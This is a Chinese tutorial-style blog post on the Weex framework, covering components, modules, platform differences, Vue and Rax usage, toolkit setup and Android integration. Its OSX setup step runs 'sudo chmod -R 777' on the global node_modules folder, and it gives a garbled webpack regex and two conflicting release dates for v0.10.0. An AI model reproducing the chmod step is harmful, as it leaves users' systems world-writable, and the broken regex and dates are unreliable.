<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div style=<span class="string">"justify-content: center"</span>&gt;</span><br><span class="line">    &lt;text <span class="class"><span class="keyword">class</span></span>=<span class="string">"freestyle"</span>&gt;Yo&lt;<span class="regexp">/text&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/template&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;style scoped&gt;</span></span><br><span class="line"><span class="regexp">  .freestyle &#123;</span></span><br><span class="line"><span class="regexp">    color: #41B883;</span></span><br><span class="line"><span class="regexp">    font-size: 233px;</span></span><br><span class="line"><span class="regexp">    text-align: center;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>style&gt;</span><br></pre></td></tr></table></figure>
<p>在 <code>&lt;template&gt;</code> 部分，包含了 <code>&lt;div&gt;</code> 元素，这个被广泛应用于 Web 页面中，在 Weex 里它也是一个通用的容器。<code>&lt;text&gt;</code> 元素就和普通的 HTML 不太一样了，它提供了显示文本的能力，在 Weex 上，所有文本必须放在 <code>&lt;text&gt;</code> 标签中。</p>
<p>在 <style> 部分，你可以定义各种 CSS 样式。需要注意的是，这些样式在 Weex 里只能作用于当前组件，<a href="https://vue-loader.vuejs.org/guide/scoped-css.html">scoped</a></p>
<h2 id="原生组件"><a href="#原生组件" class="headerlink" title="原生组件"></a>原生组件</h2><p>在上面的例子中，<code>&lt;div&gt;</code> 和 <code>&lt;text&gt;</code> 在移动端上渲染出来的都是原生组件，充分利用了操作系统组件的能力与渲染速度。</p>
<p>Weex 提供了一套基础的内置组件。你可以对这些基础组件进行封装、组合形成自己的组件；也可以创建自己的全新组件来包装操作系统提供的地图、视频等功能。可以访问 扩展 <a href="https://weex.apache.org/zh/guide/extend/extend-ios.html?spm=a2c7j.-zh-guide-introduction.0.0.1608c8eeCx4kPE">iOS</a> 能力 和 扩展 <a href="https://weex.apache.org/zh/guide/extend/extend-android.html?spm=a2c7j.-zh-guide-introduction.0.0.7f1241e9JT8E2O">Android</a> 能力来了解如何去实现自定义组件。</p>
<p>在框架内部，Weex 使用原生组件来渲染，并尽可能保持多平台一致性。但在不同平台上，或多或少会有一些渲染、行为上的差异。比如对于 <code>&lt;switch&gt;</code> 组件，在不同平台上的视觉效果是不一致的。<br><img src="https://mfaying.github.io/static/images/weex/1.jpg" alt=""></p>
<h2 id="原生模块"><a href="#原生模块" class="headerlink" title="原生模块"></a>原生模块</h2><p>对于那些不依赖于 UI 组件的功能，Weex 将它们包装成多个 模块，比如 动画模块。在前端代码中，使用 weex.requireModule(‘xxx’) 引入一个模块，之后就可以调用它提供的各种方法。Weex 模块包装了网络、存储、剪切板、导航等各种功能供前端调用。比如你可以使用 stream 模块来获取 Vue.js 的 Star 数量。</p>
<p>Weex 已经提供了不少内置模块，同时也支持将 App 特有的功能包装成自定义模块提供给前端调用。如果想了解怎么做，可以浏览以下文档。</p>
<ol>
<li>扩展 Web 组件</li>
<li>扩展 Android 能力</li>
<li>扩展 iOS 能力</li>
</ol>
<h2 id="一次编写，处处运行"><a href="#一次编写，处处运行" class="headerlink" title="一次编写，处处运行"></a>一次编写，处处运行</h2><p>Weex 的目标就是使用开发者基于一份代码，编写出可以运行在 iOS，Android 和 Web 上的应用，并最大化地提高开发效率和简化测试、构建、发布流程。</p>
<p>有一些场景，你可能仍然需要写一些平台相关的代码。Weex 提供 WXEnvironment 用来获取 Weex 运行的环境变量。</p>
<h2 id="使用前端框架"><a href="#使用前端框架" class="headerlink" title="使用前端框架"></a>使用前端框架</h2><p>Weex 应用需要依赖前端框架来编写，但 Weex 并没有绑定、限制在特定的框架上。目前 Vue.js 和 Rax 是最广泛应用于 Weex 开发的前端框架，也是目前功能最全、最稳定的方案。</p>
<ol>
<li>Vue.js 是一个不断进化中的前端框架。</li>
<li>Rax 是提供类 React 语法和兼容性的前端框架。</li>
</ol>
<p>Vue.js 和 Rax 都已经集成到 Weex 中，并默认提供。</p>
<p>将自己喜欢的前端框架和 Weex 进行结合是可以的，但并不是那么容易。我们也在不断开发和简化这种接入工作，如果想了解如何做，或有任何想法可以和我们联系。你也可以先阅读一下 使用前端框架 这篇文档了解它是做什么的。</p>
<h2 id="下一步"><a href="#下一步" class="headerlink" title="下一步"></a>下一步</h2><p>当你看到这里的时候，我相信你已经了解了 Weex 的基本知识。下一步就是深入了解 Weex 的其他特性，并且动手试一试吧。</p>
<p>如果你想用 Weex 来开发自己的应用，请阅读</p>
<ol>
<li>创建一个新的 App</li>
<li>集成到 iOS 应用</li>
<li>集成到 Android 应用</li>
<li>设置开发环境</li>
</ol>
<p>如果你想为 Weex 贡献自己的力量，比如提交代码、修改文档或提交一些 Bug，可以阅读</p>
<p>How to Contribute<br>Bug Report Guidelines</p>
<h1 id="Weex-中的前端框架"><a href="#Weex-中的前端框架" class="headerlink" title="Weex 中的前端框架"></a>Weex 中的前端框架</h1><p>前端技术看起来很繁荣，测试、打包、调试等工具都比较丰富，开发效率比原生开发要高很多。在大型项目中使用前端框架也是一个管理应用好方法，这样更方便于长期维护。</p>
<p>然而，Weex并不是一个前端框架。实际上，前端框架仅仅是 Weex 的语法层或称之为 DSL (Domain-specific Language)，它们与原生渲染引擎是分离的。换句话说，Weex 并不依赖于特定的前端框架，随着前端技术的发展，Weex 也可以集成更多广泛使用的前端框架。</p>
<h2 id="框架类型标记"><a href="#框架类型标记" class="headerlink" title="框架类型标记"></a>框架类型标记</h2><p>Weex 仅在运行时（开始渲染页面之前）才会确定页面使用哪种 DSL，因此要在页面代码中标记使用的是哪种类型的前端框架。</p>
<h2 id="使用注释标记"><a href="#使用注释标记" class="headerlink" title="使用注释标记"></a>使用注释标记</h2><p>在 Weex v0.16 以及更早的版本中，使用特定格式的注释来标记框架类型，格式是 // { “framework”: “xxx” }，其中的 xxx 指的是前端框架的名字（首字母大写）。</p>
<p>注意： 注释类型标记必须放在代码最前面。 标记之前只能有空格或者空行，不能有其他类型的字符。</p>
<p>例如 Vue 框架的类型标记如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &#123; "framework": "Vue" &#125;</span></span><br></pre></td></tr></table></figure></p>
<p>Rax 框架的类型标记如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &#123; "framework": "Rax" &#125;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="使用字符串标记-0-17"><a href="#使用字符串标记-0-17" class="headerlink" title="使用字符串标记 0.17+"></a>使用字符串标记 0.17+</h2><p>使用注释作为框架标记不够稳妥，在打包过程中有可能会被移除掉，因此从 v0.17 版本开始 Weex 支持使用 ECMAScript 规范中的“指令序言”（Directive Prologue）来标记各种前端框架的类型，标记的格式是 “use weex:xxx”;，其中的 xxx 指的是前端框架的名字，兼容单引号和双引号，字符串内容保持小写。</p>
<p>注意： 字符串类型标记必须放在所有可代码之前。 标记之前可以有空格、空行或者注释，但是不能有可执行的代码。</p>
<p>例如 Vue 框架的类型标记如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">"use weex:vue"</span>;</span><br></pre></td></tr></table></figure></p>
<p>Rax 框架的类型标记如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">"use weex:rax"</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="兼容所有版本的写法"><a href="#兼容所有版本的写法" class="headerlink" title="兼容所有版本的写法"></a>兼容所有版本的写法</h2><p>如果你集成 Weex SDK 都在 0.17 版本之上，建议使用 “use weex:vue”; 作为框架类型标记。如果考虑兼容更早的版本，可以同时使用两种类型标记。</p>
<p>例如 Vue 框架的类型标记如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &#123; "framework": "Vue" &#125;</span></span><br><span class="line"><span class="string">"use weex:vue"</span>;</span><br></pre></td></tr></table></figure></p>
<p>Rax 框架的类型标记如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &#123; "framework": "Rax" &#125;</span></span><br><span class="line"><span class="string">"use weex:rax"</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="Vue-js"><a href="#Vue-js" class="headerlink" title="Vue.js"></a>Vue.js</h2><p>Weex 从 v0.10.0（发布于 2017/02/17）这个版本开始，就集成了 v2 版本的 Vue.js。Vue.js 是一套用于构建用户界面的渐进式框架，详情请参阅其官方网站。</p>
<h2 id="Rax"><a href="#Rax" class="headerlink" title="Rax"></a>Rax</h2><p>Rax 是一个兼容 React 接口的前端框架，请参考 Rax 的官方网站 来获得更多信息。</p>
<h1 id="Weex-和-Web-的平台差异"><a href="#Weex-和-Web-的平台差异" class="headerlink" title="Weex 和 Web 的平台差异"></a>Weex 和 Web 的平台差异</h1><p>Weex 是一个跨平台解决方案，Web 平台只是其一种运行环境，除此之外还可以在 Android 和 iOS 客户端中运行。原生开发平台和 Web 平台之间的差异，在功能和开发体验上都有一些差异。</p>
<h2 id="Weex-环境中没有-DOM"><a href="#Weex-环境中没有-DOM" class="headerlink" title="Weex 环境中没有 DOM"></a>Weex 环境中没有 DOM</h2><p>DOM（Document Object Model），即文档对象模型，是 HTML 和 XML 文档的编程接口，是 Web 中的概念。Weex 的运行环境以原生应用为主，在 Android 和 iOS 环境中渲染出来的是原生的组件，不是 DOM Element。</p>
<h2 id="不支持-DOM-操作"><a href="#不支持-DOM-操作" class="headerlink" title="不支持 DOM 操作"></a>不支持 DOM 操作</h2><p>原生环境中不支持 Web API，没有 Element 、Event 、File 等对象，详细列表可以参考 Web APIs on MDN。不支持选中元素，如 document.getElementById 、 document.querySelector 等；当然也不支持基于 DOM API 的程序库（如 jQuery）。</p>
<h2 id="有限的事件类型"><a href="#有限的事件类型" class="headerlink" title="有限的事件类型"></a>有限的事件类型</h2><p>Weex 支持在标签上绑定事件，和在浏览器中的写法一样，但是 Weex 中的事件是由原生组件捕获并触发的，行为和浏览器中有所不同，事件中的属性也和 Web 中有差异。</p>
<ol>
<li>支持 Web 中的事件类型，详情请参考《通用事件》。</li>
<li>不区分事件的捕获阶段和冒泡阶段，相当于 DOM 0 级事件。</li>
</ol>
<h2 id="Weex-环境中没有-BOM"><a href="#Weex-环境中没有-BOM" class="headerlink" title="Weex 环境中没有 BOM"></a>Weex 环境中没有 BOM</h2><p>BOM（Browser Object Model），即浏览器对象模型，是浏览器环境为 javascript 提供的接口。Weex 在原生端并不基于浏览器运行，不支持浏览器提供的 BOM 接口。</p>
<p>没有 window 、screen 对象</p>
<p>Weex 中并未提供浏览器中的 window 和 screen 对象，不支持使用全局变量。如果是想要获取设备的屏幕或环境信息，可以使用 WXEnvironment 变量。</p>
<p>WXEnvironment</p>
<ol>
<li>weexVersion: WeexSDK 的版本。</li>
<li>appName: 应用的名称。</li>
<li>appVersion: 应用的版本。</li>
<li>platform: 运行平台，可能的值是 Web 、Android 、iOS 之一。</li>
<li>osName: 系统的名称。</li>
<li>osVersion: 系统版本。</li>
<li>deviceWidth: 设备宽度。</li>
<li>deviceHeight: 设备高度。</li>
</ol>
<p>没有 document 对象</p>
<p>在浏览器中 document 表示了当前活动的文档模型，在 Android 和 iOS 环境中并没有这个对象，也不支持与其相关的 DOM 操作。</p>
<p>没有 history 、location 、navigator 对象</p>
<ol>
<li>history 保存了当前页面的历史记录，并且提供了前进后退操作。</li>
<li>location 记录了当前页面 URL 相关的信息。</li>
<li>navigator 记录了当前浏览器中的信息。</li>
</ol>
<p>这些接口与浏览器自身的实现有关，可以控制页面的前进后退并且获取状态信息。虽然在 Android 和 iOS 中也有“历史”和“导航”的概念，但是它是用于多个管理视图之间的跳转的。换句话说，在浏览器中执行“前进”、“后退”仍然会处于同一个页签中，在原生应用中“前进”、“后退”则会真实的跳转到其他页面。</p>
<p>此外 Weex 也提供了 navigator 模块来操作页面的跳转，使用方法参考《navigator 导航控制》。</p>
<h2 id="能够调用移动设备原生-API"><a href="#能够调用移动设备原生-API" class="headerlink" title="能够调用移动设备原生 API"></a>能够调用移动设备原生 API</h2><p>在 Weex 中能够调用移动设备原生 API，使用方法是通过注册、调用模块来实现。其中有一些模块是 Weex 内置的，如 clipboard 、 navigator 、storage 等。</p>
<ol>
<li>《clipboard 剪切板》</li>
<li>《navigator 导航控制》</li>
<li>《storage 本地存储 》</li>
</ol>
<p>为了保持框架的通用性，Weex 内置的原生模块有限，不过 Weex 提供了横向扩展的能力，可以扩展原生模块，具体的扩展方法请参考《iOS 扩展》 和《Android 扩展》。</p>
<p>有些接口在浏览器环境中也存在，不过在使用时应该注意浏览器的兼容性；如剪贴板功能，出于安全性考虑，绝大多数浏览器都限制其使用。</p>
<h2 id="在-Weex-中使用-Vue-js"><a href="#在-Weex-中使用-Vue-js" class="headerlink" title="在 Weex 中使用 Vue.js"></a>在 Weex 中使用 Vue.js</h2><p>在 WeexSDK v0.10.0 （发布于 2016 年 2 月 17 日）以及后续的版本中，集成了 v2 版本的 Vue.js。Vue 是一套构建用户界面的渐进式框架，详情请参阅其官方网站。</p>
<h2 id="只含有运行时的构建版本"><a href="#只含有运行时的构建版本" class="headerlink" title="只含有运行时的构建版本"></a>只含有运行时的构建版本</h2><p>如果你熟悉 Vue.js，你应该知道 Vue.js 有两种构建版本: 运行时 + 编译器 与 只包含运行时。它们之间的区别在于编译器是否需要能够在运行时编译 template 选项。由于运行时构建版本比完整版本的构建版本轻约 30%（Vue 官方估算），为了更好的性能和更小的代码体积，Weex 集成的是运行时版本的 Vue。</p>
<p>具体来说，差异如下：</p>
<ol>
<li>定义组件时不支持 template 选项。</li>
<li>不支持使用 x-templates。</li>
<li>不支持使用 Vue.compile。</li>
</ol>
<h2 id="平台的差异"><a href="#平台的差异" class="headerlink" title="平台的差异"></a>平台的差异</h2><p>Vue.js 最初是为 Web 平台设计的。虽然可以基于Weex开发原生应用程序，但是仍然存在许多Weex 与 Web 平台的差异。</p>
<p>与 Web 平台的主要差异是: 执行环境、DOM、样式和事件。</p>
<p>执行环境</p>
<p>Weex 主要用于编写多页的应用程序，每个页面都对应了原生开发中的 View 或者 Activity，并且保持自己的上下文。即使 Weex 的所有页面都使用的都是同一个 Javascript 引擎的实例(virtual machine)，每个页面是执行环境也是互相隔离的（基于 Sandbox 技术）。</p>
<p>注：使用 BroadcastChannel 可以实现跨页通信。</p>
<p>具体来讲，每个页面的 Vue 变量都是不同的实例，即使是写在 Vue 上的“全局”配置（Vue.config.xxx）也只会影响 Weex 上的单个页面。</p>
<p>在此基础上，一些 Vue 的 SPA （单页面应用）技术，如 Vuex 和 vue-router 也将单页内生效。更通俗地说，“页面”概念在 SPA 技术中是虚拟的，但在 Weex 上却是真实的。即便如此，Vuex 和 vue-router 都是独立的库，都有自己的概念和使用场景，仍然可以在 Weex 里使用 Vuex 和 vue-router。</p>
<h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><p>因为在 Android 和 iOS 上没有 DOM（Document Object Model），如果你要手动操作和生成 DOM 元素的话可能会遇到一些兼容性问题。在你使用现代前端框架的情况下，操作数据与组件而不是生成的元素是一个比较好的做法。</p>
<p>一些与 DOM 相关的特性，比如 v-html，vm.$el，template 选项，在不同的平台上可能无法获得相同的反应。</p>
<p>准确来说，vm.$el属性类型在web环境下是HTMLElement，但是在移动端并没有这个类型。实际上，它是一个由 Weex 文档对象模型 定义的特殊数据结构。</p>
<h2 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h2><p>样式表和 CSS 规则是由 Weex js 框架和原生渲染引擎管理的。要实现完整的 CSS 对象模型（CSSOM：CSS Object Model）并支持所有的 CSS 规则是非常困难的，而且没有这个必要。</p>
<p>出现性能考虑，Weex 目前只支持单个类选择器，并且只支持 CSS 规则的子集。详情请参阅 通用样式 与 文本样式。</p>
<p>在 Weex 里， 每一个 Vue 组件的样式都是 scoped。</p>
<h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><p>目前在 Weex 里不支持事件冒泡和捕获，因此 Weex 原生组件不支持事件修饰符，例如.prevent，.capture，.stop，.self 。</p>
<p>此外，按键修饰符以及系统修饰键 例如 .enter，.tab，.ctrl，.shift 在移动端基本没有意义，在 Weex 中也不支持。</p>
<h2 id="Web-渲染器"><a href="#Web-渲染器" class="headerlink" title="Web 渲染器"></a>Web 渲染器</h2><p>如果你想在网络上呈现你的页面，你需要 weex-vue-render 来实现它。</p>
<p>weex-vue-render是 Vue DSL 的 Web 渲染器， 它在 Web 上实现了 Weex 的内置组件和内置模块。详情请参阅这里。</p>
<h2 id="单文件组件"><a href="#单文件组件" class="headerlink" title="单文件组件"></a>单文件组件</h2><p>Vue 中的单文件组件（即*.vue文件）是一种特殊的文件格式，扩展名为.vue。这个模板会在构建时便于到render函数里。</p>
<p>此外，所有的编辑器里都支持一个好的语法高亮插件。</p>
<p>在 Weex 中使用单个文件组件语法是一种很好的做法。</p>
<p>注：在 Weex 中使用 Vue 的单个文件组件语法是一种最佳实践。</p>
<p>因为针对 Weex 的 Web 平台的编译工具并不一样，如果你直接写的 render 函数，则绕过了 weex-loader 编译模板的过程，这样的话你需要自行处理平台差异的细节。</p>
<h2 id="编译目标"><a href="#编译目标" class="headerlink" title="编译目标"></a>编译目标</h2><p>因为平台的差异以及为了提高网络性能，*.vue文件需要用两种不同的方式来编译：</p>
<ol>
<li><p>对于 Web 平台来说，你可以用任何正式的方式来编译源文件，例如 使用 Webpack + vue-loader 或者 Browserify + vueify 来编译*.vue文件。</p>
</li>
<li><p>对于安卓与 iOS 平台来说， 你需要使用 weex-loader 来编译*.vue文件。</p>
</li>
</ol>
<p>不同的平台使用不同的bundles，可以充分利用平台原有的特性，减少构建时的兼容性代码。但是源代码仍然是一样的，唯一的区别是编译它的方法。</p>
<h2 id="使用weex-loader"><a href="#使用weex-loader" class="headerlink" title="使用weex-loader"></a>使用weex-loader</h2><p>weex-loader 是一个 webpack 的 loader，它能把*.vue文件转化为简单的javascript 模块用于安卓以及 iOS 平台。所有的特性和配置都是跟 vue-loader 一样的。</p>
<p>需要注意的是，如果 Webpack 的 entry 配置项是一个 *.vue 文件的话，你仍需要传递一个额外的 entry 参数作为标记。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> webpackConfig = &#123;</span><br><span class="line">  <span class="comment">// Add the entry parameter for the .vue file</span></span><br><span class="line">  entry: <span class="string">'./path/to/App.vue?entry=true'</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">  use: &#123;</span><br><span class="line">    loaders: [&#123;</span><br><span class="line">      <span class="comment">// matches the .vue file path which contains the entry parameter</span></span><br><span class="line">      test: <span class="regexp">/\.vue(\?^^]+)?$/</span>,</span><br><span class="line">      loaders: [<span class="string">'weex-loader'</span>]</span><br><span class="line">    &#125;]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果你现在用的是.js文件做入口文件，你不需要写那些额外的参数。 推荐 webpack 配置的入口文件使用 javascript 文件。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  entry: &apos;./path/to/entry.js&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注:无论什么情况下都使用 javascript 文件作为入口文件。</p>
<h2 id="支持的功能"><a href="#支持的功能" class="headerlink" title="支持的功能"></a>支持的功能</h2><p>全局配置</p>
<p>Vue “全局”配置只会影响 Weex 上的单一页面，配置不会在不同的 Weex 页面之间共享。<br><img src="https://mfaying.github.io/static/images/weex/2.jpg" alt=""></p>
<h2 id="全局-API"><a href="#全局-API" class="headerlink" title="全局 API"></a>全局 API</h2><p><img src="https://mfaying.github.io/static/images/weex/3.jpg" alt=""></p>
<h2 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h2><p><img src="https://mfaying.github.io/static/images/weex/4.jpg" alt=""><br><img src="https://mfaying.github.io/static/images/weex/5.jpg" alt=""></p>
<h2 id="生命周期钩子"><a href="#生命周期钩子" class="headerlink" title="生命周期钩子"></a>生命周期钩子</h2><p>Vue 组件的实例生命周期钩子将在特定的阶段发出，详情请参考 Vue 组件的生命周期图示。<br><img src="https://mfaying.github.io/static/images/weex/6.jpg" alt=""></p>
<p>注：和浏览不同的是，Weex 的渲染流程是异步的，而且渲染出来的结果都是原生系统中的 View，这些数据都无法被 javascript 直接获取到。因此在 Weex 上，Vue 的 mounted 生命周期在当前组件的 virtual-dom (Vue 里的 VNode) 构建完成后就会触发，此时相应的原生视图未必已经渲染完成。</p>
<h2 id="实例属性"><a href="#实例属性" class="headerlink" title="实例属性"></a>实例属性</h2><p><img src="https://mfaying.github.io/static/images/weex/7.jpg" alt=""></p>
<h2 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h2><p><img src="https://mfaying.github.io/static/images/weex/8.jpg" alt=""></p>
<p>模板指令<br><img src="https://mfaying.github.io/static/images/weex/9.jpg" alt=""></p>
<p>特殊属性<br><img src="https://mfaying.github.io/static/images/weex/10.jpg" alt=""></p>
<p>内置组件<br><img src="https://mfaying.github.io/static/images/weex/11.jpg" alt=""></p>
<h2 id="在-Weex-中使用-Rax"><a href="#在-Weex-中使用-Rax" class="headerlink" title="在 Weex 中使用 Rax"></a>在 Weex 中使用 Rax</h2><p>Rax 是一个兼容 React 接口的前端框架，请访问 <a href="https://alibaba.github.io/rax/?spm=a2c7j.-zh-guide-use-rax-in-weex.0.0.763f22d7Pun29g">Rax 的官方网站</a> 了解更多信息。</p>
<h1 id="设置开发环境"><a href="#设置开发环境" class="headerlink" title="设置开发环境"></a>设置开发环境</h1><p>使用 Weex Online Editor 对 Weex 尝鲜是一个不错的选择，但如果你想更专业的开发 Weex，本节会教你如何搭建本地开发环境进行 Weex 开发。</p>
<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><p>Weex 官方提供了weex-toolkit 的脚手架工具来辅助开发和调试。</p>
<p>首先，你需要 Node.js 和 Weex CLi。</p>
<p>安装 Node.js 方式多种多样，最简单的方式是在 Node.js 官网 下载可执行程序直接安装即可。更多安装方式可参考 Node.js 官方信息</p>
<p>通常，安装了 Node.js 环境，npm 包管理工具也随之安装了。因此，直接使用 npm 来安装 weex-toolkit, 你也可以通过 yarn 来进行安装。</p>
<p>国内的开发者推荐将npm镜像切换至 Taobao NPM 镜像 <a href="https://registry.npm.taobao.org。">https://registry.npm.taobao.org。</a></p>
<p>运行下面的命令安装最新的beta版本工具：</p>
<h2 id="OSX环境"><a href="#OSX环境" class="headerlink" title="OSX环境"></a>OSX环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo chmod -R 777 /usr/local/lib/node_modules/</span><br><span class="line">$ npm i -g weex-toolkit // 安装不要使用sudo执行</span><br><span class="line">$ weex -v // 查看当前weex工具版本</span><br></pre></td></tr></table></figure>
<h2 id="Windows环境"><a href="#Windows环境" class="headerlink" title="Windows环境"></a>Windows环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm i -g weex-toolkit </span><br><span class="line">$ weex -v // 查看当前weex工具版本</span><br></pre></td></tr></table></figure>
<p>安装结束后你可以直接使用 weex help 命令验证是否安装成功，它会显示 weex 支持的所有指令，同时，你也可以通过 weex doctor 命令检查你的本地开发环境。</p>
<h2 id="初始化项目"><a href="#初始化项目" class="headerlink" title="初始化项目"></a>初始化项目</h2><p>然后初始化 Weex 项目：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ weex create awesome-project</span><br></pre></td></tr></table></figure></p>
<p>执行完命令后，在 awesome-project 目录中已经为我们生成了标准项目结构。</p>
<h2 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h2><p>进入项目所在路径，如果你在生成项目的时候选择了自动安装依赖，在进入项目后只需直接运行 npm start 就可以将项目完整跑起来，否则，你需要预先在项目中运行一下 npm install 安装项目所需依赖。</p>
<p>关于 Weex 语法部分，你可以直接参考 Vue Guide，这里不再重复介绍。如果您想了解有关技术详情的更多信息，请继续阅读下一节。</p>
<h1 id="创建一个-App"><a href="#创建一个-App" class="headerlink" title="创建一个 App"></a>创建一个 App</h1><p>以下步骤假设您已经了解了 Node.js 和 npm 的基本知识。如果对它们不熟悉，可以访问 <a href="https://docs.npmjs.com/">https://docs.npmjs.com/</a> 来了解更多关于 npm 的用法。</p>
<p>Weex 提供了一个命令行工具 weex-toolkit 来帮助开发者使用 Weex。它可以用来快速创建一个空项目、初始化 iOS 和 Android 开发环境、调试、安装插件等操作。</p>
<p>目前 weex-toolkit 只支持创建 Vue.js 的项目。创建 Rax 的项目可以使用 rax-cli，参考 Rax 的官方网站 了解其用法。</p>
<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>请确保你已经安装了 Node.js，然后全局安装 weex-toolkit。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install weex-toolkit -g</span><br></pre></td></tr></table></figure></p>
<p>这条命令会向你命令行环境中注册一个 weex 命令。你可以用 weex create 命令来创建一个空的模板项目：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">weex create awesome-app</span><br></pre></td></tr></table></figure></p>
<p>命令执行完以后，在当前目录的 awesome-app 文件夹里就有了一个空的 Weex + Vue.js 项目。</p>
<h2 id="开发-1"><a href="#开发-1" class="headerlink" title="开发"></a>开发</h2><p>下一步就是进入刚刚创建的文件夹，并且安装依赖，然后执行 npm start：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd awesome-app</span><br><span class="line">npm install</span><br><span class="line">npm start</span><br></pre></td></tr></table></figure></p>
<p>然后工具会启动一个本地的 web 服务，监听 8081 端口。你可以打开 <a href="http://localhost:8081">http://localhost:8081</a> 查看页面在 Web 下的渲染效果。 源代码在 src/ 目录中，你可以像一个普通的 Vue.js 项目一样来开发.</p>
<p>除此之外，你还可以打开 <a href="http://localhost:8081/preview.html">http://localhost:8081/preview.html</a> 开启一个预览页面，它会把 web 端的页面放在一个 iframe 中渲染，而且在右侧生成一个二维码。用 Weex playground app 扫描这个二维码可以看到页面在手机上渲染的真实效果。</p>
<h2 id="编译和运行"><a href="#编译和运行" class="headerlink" title="编译和运行"></a>编译和运行</h2><p>默认情况下 weex create 命令并不初始化 iOS 和 Android 项目，你可以通过执行 weex platform add 来添加特定平台的项目。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">weex platform add ios</span><br><span class="line">weex platform add android</span><br></pre></td></tr></table></figure></p>
<p>由于网络环境的不同，安装过程可能需要一些时间，请耐心等待。如果安装失败，请确保自己的网络环境畅通。</p>
<p>为了能在本地机器上打开 Android 和 iOS 项目，你应该配置好客户端的开发环境。对于 iOS，你应该安装并且配置好 Xcode。对于 Android，你应该安装并且配置好 Android Studio。当开发环境准备就绪后，运行下面的命令，可以在模拟器或真实设备上启动应用：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">weex run ios</span><br><span class="line">weex run android</span><br><span class="line">weex run web</span><br></pre></td></tr></table></figure></p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>weex-toolkit 还提供了强大的调试功能，只需要执行：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">weex debug</span><br></pre></td></tr></table></figure></p>
<p>这条命令会启动一个调试服务，并且在 Chrome （目前只支持基于 V8 引擎的桌面浏览器） 中打开调试页面。详细用法请参考 weex-toolkit 的文档。</p>
<h1 id="集成到Android应用"><a href="#集成到Android应用" class="headerlink" title="集成到Android应用"></a>集成到Android应用</h1><p>注意：考虑到包大小的问题, 暂不提供 Android x86 so 的支持.</p>
<p>在执行以下步骤之前，请先确认您的Android开发环境是ok的。</p>
<ol>
<li>JAVA环境, jdk7+</li>
<li>Android Studio</li>
<li>NDK r18、Cmake 3.9.0+ (可选项：如果需要编译WEEX源码，需要NDK环境支持)</li>
</ol>
<h2 id="1-设置gradle依赖"><a href="#1-设置gradle依赖" class="headerlink" title="1. 设置gradle依赖"></a>1. 设置gradle依赖</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    ...</span><br><span class="line">    // weex sdk and fastjson</span><br><span class="line">    compile &apos;com.taobao.android:weex_sdk:0.20.0.2@aar&apos;</span><br><span class="line">    compile &apos;com.alibaba:fastjson:1.1.46.android&apos;</span><br><span class="line"></span><br><span class="line">    //support library dependencies</span><br><span class="line">    compile &apos;com.android.support:recyclerview-v7:23.1.1&apos;</span><br><span class="line">    compile &apos;com.android.support:support-v4:23.1.1&apos;</span><br><span class="line">    compile &apos;com.android.support:appcompat-v7:23.1.1&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-配置混淆规则"><a href="#2-配置混淆规则" class="headerlink" title="2. 配置混淆规则"></a>2. 配置混淆规则</h2><p>混淆规则如下，建议参考最新的源码配置<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-keep class com.taobao.weex.bridge.** &#123; *; &#125;</span><br><span class="line">-keep class com.taobao.weex.layout.** &#123; *; &#125;</span><br><span class="line">-keep class com.taobao.weex.WXSDKEngine &#123; *; &#125;</span><br><span class="line">-keep class com.taobao.weex.base.SystemMessageHandler &#123; *; &#125;</span><br><span class="line">-dontwarn com.taobao.weex.bridge.**</span><br></pre></td></tr></table></figure></p>
